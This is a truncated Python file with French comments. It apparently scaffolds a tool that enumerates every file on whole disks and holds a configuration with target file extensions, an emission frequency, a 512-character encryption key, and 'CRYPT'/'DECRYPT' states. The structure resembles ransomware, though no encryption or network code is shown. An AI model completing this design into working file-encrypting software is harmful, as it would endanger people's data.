import json
import os
import glob

def lister_chemins_fichiers(disque):

    disk = str(disque)
    path_files = glob.glob(f'{disque}:/**/*', recursive = True)

    return path_files

def lire_fichier(path_file):

    file = open(path_file, "r")
    content = file.read()
    file.close()

    return content

def creation_fichier_json():

    setting = {'DISKS': [], # doit être une liste de string contenant les disques
               'PATHS': [], # doit être une liste de string contenant les chemins vers les fichiers des disques
               'FILE_EXT': [], # doit être une liste de string contenant les différentes extensions des fichiers des disques
               'FREQ': 0, # doit être un int, est la fréquence d'émission en seconde
               'KEY': '', # doit être une string contenant 512 caractères imprimables pour la clé de chiffrement
               'STATE': '' # doit être une string contenant les états "INITIALIZE", "CRYPT", "PENDING", "DECRYPT" ou "PROTECTED"
               }

    with open("../configure/config/setting.json","w") as f:
        json.dump(setting, f)

def encrypt_